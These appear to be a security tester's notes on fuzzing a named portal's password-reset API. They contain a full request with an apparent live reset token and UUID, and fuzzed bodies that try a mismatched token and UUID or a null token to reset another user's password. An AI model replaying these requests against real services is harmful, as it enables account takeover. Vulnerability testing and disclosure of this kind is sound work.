# Requests

PUT /user-management/user/reset-password HTTP/1.1
Host: portal.skillab-project.eu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 183
Origin: https://portal.skillab-project.eu
Referer: https://portal.skillab-project.eu/reset-password?token=Igu1AaR3Rf%2FzONxs1ogF3tIjtb6jrnbLE%2FFxtw2vPsR%2B6K1qctMfFetL84YnaNTCtaOauJD%2Bptt2WuAB3dUjIUUABJX6kNteXBzQ&uuid=41289887-c0af-4a29-af22-02b478c2eaf4
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive


Fuzzed Request Bodies:

{
    "password":"a",
    "token":"[VALID TOKEN OF USER B]",
    "uuid":"[VALID UUID OF USER A]"
}


The user with that UUID needs to have a token that is not expired yet

{
"password":"aaa",
"token":null,
"uuid":"41289887-c0af-4a29-af22-02b478c2eaf4“
}


If you sent a Request without one of the fields you get an Internal Server Error




{
    "password":"a","token":{
	    "value":"null"
    }
    ,
    "uuid":"41289887-c0af-4a29-af22-02b478c2eaf4"
}

